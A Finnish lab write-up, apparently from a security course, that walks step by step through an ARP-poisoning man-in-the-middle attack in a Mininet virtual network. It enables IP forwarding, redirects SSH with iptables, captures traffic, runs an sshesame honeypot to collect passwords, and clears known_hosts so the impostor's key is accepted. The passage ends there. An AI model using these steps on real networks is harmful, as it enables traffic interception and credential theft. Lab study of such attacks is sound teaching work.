Ajoin toisessa terminaali-ikkunassa slidesin komennon `ryu-manager ryu.app.simple_switch_13`

Tällä komennolla käynnistin Ryu-verkko-ohjaimen, joka toimii OpenFlow-kontrollerina Mininet-verkolle eli hallitsee kytkimen pakettien reititystä.

Ryu täytyy käynnistää ensin erillisessä ikkunassa, koska Mininet ottaa siihen yhteyden käynnistyessään.


ja toisessa `sudo mn --topo single,3 --mac --switch ovsk --controller remote`

`sudo mn` käynnistää Minetin pääkäyttäjän oikeuksilla, koska verkkorajapintojen luominen vaatii ne.

`--topo single,3` luo topologian jossa on yksi kytkin ja kolme hostia (h1, h2, h3) kaikki kytkettynä samaan kytkimeen.

`--mac` asettaa hosteille yksinkertaiset MAC-osoitteet järjestyksessä (00:00:00:00:00:01, 00:00:00:00:00:02, 00:00:00:00:00:03) sen sijaan että ne generoitaisiin satunnaisesti, mikä helpottaa tunnistamista harjoituksessa.

`--switch ovsk` käyttää Open vSwitchiä virtuaalikytkimenä, joka tukee OpenFlow-protokollaa.

`--controller remote` kertoo Mininetille että verkko-ohjain on erillinen prosessi joka kuuntelee oletusportissa, eli aiemmin käynnistetty Ryu.


Ryu kirjasi kaikki paketit jotka kytkin lähetti OpenFlow-kontrollerille.

Komento `xterm h1` herjasi, että `Error: Cannot connect to display`, joten ajoin komennon `h1 arp -n`

Tällä komennolla tarkistin h1:n ARP-taulun ennen hyökkäystä.

ARP-taulu on tietokoneen muistissa oleva lista joka yhdistää IP-osoitteet MAC-osoitteisiin.

Ennen hyökkäystä tiedot ovat oikein: h2:n IP osoittaa h2:n MAC-osoitteeseen ja h3:n IP osoittaa h3:n MAC-osoitteeseen.

```bash
mininet> h1 arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.0.0.2                 ether   00:00:00:00:00:02   C                     h1-eth0
10.0.0.3                 ether   00:00:00:00:00:03   C                     h1-eth0
```

Sitten ajoin komennot:

`h3 sysctl -w net.ipv4.ip_forward=1`

Tällä aktivoin h3:lle IP-forwardingin.

Normaalisti tietokone hylkää paketit jotka eivät ole osoitettu sille.

Ilman IP-forwardingia h3 pudottaisi kaikki h1:ltä h2:lle tarkoitetut paketit, jolloin h1:n yhteydet lakkaisivat toimimasta ja hyökkäys paljastuisi heti.

IP-forwarding tekee sen, että kun ARP-myrkytys ohjaa liikenteen h3:n kautta, h3 ei pudota niitä vaan ohjaa ne eteenpäin h2:lle, joka ei tiedä, että ne kävivät välissä missään.

h1 saa vastauksia h2:lta normaalisti eikä näe mitään epäilyttävää.

`h3 iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 22`

Tämä lisää NAT-säännön joka ohjaa h3:lle saapuvan SSH-liikenteen paikalliselle sshesame-ohjelmalle.

Ilman tätä sääntöä SSH-yhteys menisi suoraan eteenpäin h2:lle eikä salasanaa kaapattaisi.

`h3 tcpdump -i h3-eth0 -w arp-p.pcap &`

Tämä käynnistää pakettien tallennuksen h3:n verkkoliitännässä.

Pcap-tiedosto tulee sisältämään kaiken h3:n kautta kulkevan liikenteen ja sitä voi analysoida myöhemmin esimerkiksi Wiresharkilla.

`&` ajaa komennon taustalla jotta voin jatkaa muiden komentojen ajamista.

```bash
mininet> h3 sysctl -w net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1
mininet> h3 iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 22
mininet> h3 tcpdump -i h3-eth0 -w arp-p.pcap &
mininet>
```

Sitten ajoin komennon `h3 sshesame -port 22 -listen_address 0.0.0.0 &`

Tämä käynnisti sshesame-honeypotin h3:lla.

Sshesame on SSH-palvelin joka hyväksyy kaikki kirjautumisyritykset salasanasta riippumatta ja tallentaa käytetyt salasanat lokiinsa.

Se esittää olevansa oikea SSH-palvelin, joten kirjautuva käyttäjä ei huomaa mitään erikoista.

```bash
mininet> h3 sshesame -port 22 -listen_address 0.0.0.0 &
tcpdump: listening on h3-eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
```

Sitten ajoin komennon `h3 python3 ./arp_poison.py &`

Tämä tekee ARP-myrkytyksen.

Skripti lähettää jatkuvasti väärennettyjä ARP-vastauksia verkkoon väittäen, että h2:n IP-osoite (10.0.0.2) kuuluu h3:n MAC-osoitteelle.

h1 päivittää ARP-taulunsa näiden vastausten perusteella, koska ARP-protokolla ei tarkista vastaajan henkilöllisyyttä.

```bash
mininet> h3 python3 ./arp_poison.py &
WARN[0000] Using a temporary host key, consider creating a permanent one and passing it to -host_key  sha256_fingerprint="[81 42 165 135 88 11 57 80 176 79 236 58 125 249 47 168 242 111 110 29 94 72 60 10 96 0 52 182 232 139 86 98]"
INFO[0000] Listening                                     listen_address="0.0.0.0:22"
```

Sitten ajoin komennon `h1 ssh h2`

Tällä yritin muodostaa SSH-yhteyden h1:ltä h2:lle.

Sitten ajoin komennon `h1 ssh-keygen -R 10.0.0.2`

Tällä poistin h1:n known_hosts-tiedostosta vanhan h2:n host keyn.

Nyt kun teen `h1 ssh h2` uudestaan h1 hyväksyy h3:n host keyn h2 nimissä.

```bash
mininet> h1 ssh-keygen -R 10.0.0.2
```
